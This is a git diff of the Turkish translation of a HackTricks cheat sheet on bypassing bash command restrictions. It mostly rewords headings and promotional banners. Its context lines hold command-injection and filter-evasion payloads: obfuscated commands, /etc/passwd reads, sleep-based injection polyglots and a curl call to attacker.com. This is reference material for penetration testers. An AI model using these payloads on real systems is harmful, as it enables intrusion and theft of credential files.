@@ -2,13 +2,13 @@
 
 <details>
 
-<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Sıfırdan kahraman olmaya kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
 
 HackTricks'ı desteklemenin diğer yolları:
 
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
+* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
+* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
 * **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin.**
 * **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
@@ -17,12 +17,12 @@ HackTricks'ı desteklemenin diğer yolları:
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=bypass-bash-restrictions) kullanarak dünyanın **en gelişmiş topluluk araçları** tarafından desteklenen ve **iş akışlarını otomatikleştiren** kolayca oluşturun.\
+[**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=bypass-bash-restrictions) kullanarak dünyanın **en gelişmiş** topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
 Bugün Erişim Alın:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=bypass-bash-restrictions" %}
 
-## Yaygın Kısıtlamaları Atlatma
+## Ortak Kısıtlamaları Atlatma Yöntemleri
 
 ### Ters Kabuk
 ```bash
@@ -75,13 +75,18 @@ $(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
 $(rev<<<'imaohw') #whoami
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64
 
-
 # Execution through $0
 echo whoami|$0
 
 # Uninitialized variables: A uninitialized variable equals to null (nothing)
 cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
 p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters
+
+# New lines
+p\
+i\
+n\
+g # These 4 lines will equal to ping
 
 # Fake commands
 p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
@@ -116,12 +121,6 @@ X=$'cat\x20/etc/passwd'&&$X
 # Using tabs
 echo "ls\x09-l" | bash
 
-# New lines
-p\
-i\
-n\
-g # These 4 lines will equal to ping
-
 # Undefined variables and !
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
@@ -154,7 +153,7 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
-### Çevresel Değişkenlerden Karakter Alma
+### Ortam Değişkenlerinden Karakter Alma
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
@@ -165,8 +164,8 @@ echo ${PATH:0:1} #/
 
 ### Yerleşik Fonksiyonlar
 
-Dış fonksiyonları yürütemediğiniz ve yalnızca bir **sınırlı yerleşik fonksiyon kümesine erişiminiz olduğu durumlarda RCE elde etmek için bazı kullanışlı hileler bulunmaktadır. Genellikle **tüm** **yerleşikleri** kullanamayacaksınız, bu yüzden hapishaneden kaçmak için tüm seçeneklerinizi bilmelisiniz. Fikir [**devploit**](https://twitter.com/devploit)'ten alınmıştır.\
-İlk olarak tüm [**shell yerleşiklerini**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)** kontrol edin.** Sonra size bazı **tavsiyelerimiz** var:
+Dış fonksiyonları yürütemiyorsanız ve yalnızca bir **sınırlı sayıda yerleşik fonksiyona erişiminiz varsa RCE elde etmek için**, bunu yapmanın bazı kullanışlı hileleri vardır. Genellikle **tüm yerleşikleri kullanamayacaksınız**, bu yüzden hapishaneden kaçmayı denemek için **tüm seçeneklerinizi bilmelisiniz**. Fikir [**devploit**](https://twitter.com/devploit)'ten alınmıştır.\
+Öncelikle tüm [**shell yerleşiklerini**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)** kontrol edin.** Sonra burada bazı **tavsiyeleriniz** var:
 ```bash
 # Get list of builtins
 declare builtins
@@ -223,7 +222,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Potansiyel regexleri atlatma
+### Potansiyel regexleri atlayın
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -317,15 +316,15 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Salt-Okunur/Noexec/Distroless Atlatma
+## Salt-Okuma/Noexec/Distroless Atlatma
 
-Eğer **salt-okunur ve noexec korumaları** olan bir dosya sistemi içinde veya hatta bir distroless konteyner içindeyseniz, hala **keyfi ikili dosyaları, hatta bir kabuğu çalıştırmanın yolları** vardır:
+Eğer **salt-okuma ve noexec korumaları** olan bir dosya sistemi içinde veya hatta bir distroless konteyner içindeyseniz, hala **keyfi ikili dosyaları, hatta bir kabuğu çalıştırmanın yolları** vardır:
 
 {% content-ref url="bypass-fs-protections-read-only-no-exec-distroless/" %}
 [bypass-fs-protections-read-only-no-exec-distroless](bypass-fs-protections-read-only-no-exec-distroless/)
 {% endcontent-ref %}
 
-## Chroot ve Diğer Hapisaneler Atlatma
+## Chroot ve Diğer Hapislerin Atlatılması
 
 {% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
 [escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
@@ -341,21 +340,21 @@ Eğer **salt-okunur ve noexec korumaları** olan bir dosya sistemi içinde veya 
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=bypass-bash-restrictions) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **otomatik iş akışlarını** kolayca oluşturun ve otomatikleştirin.\
+[**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=bypass-bash-restrictions) kullanarak dünyanın **en gelişmiş** topluluk araçları tarafından desteklenen **otomatik iş akışlarını** kolayca oluşturun ve otomatikleştirin.\
 Bugün Erişim Alın:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=bypass-bash-restrictions" %}
 
 <details>
 
-<summary><strong>Sıfırdan kahraman olacak şekilde AWS hacklemeyi</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile öğrenin!</strong></summary>
+<summary><strong>Sıfırdan kahraman olacak şekilde AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 HackTricks'ı desteklemenin diğer yolları:
 
 * **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
-* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katılın veya** bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
-* **Hacking püf noktalarınızı göndererek HackTricks ve HackTricks Cloud** github depolarına PR'lar göndererek **paylaşın.**
+* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
+* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
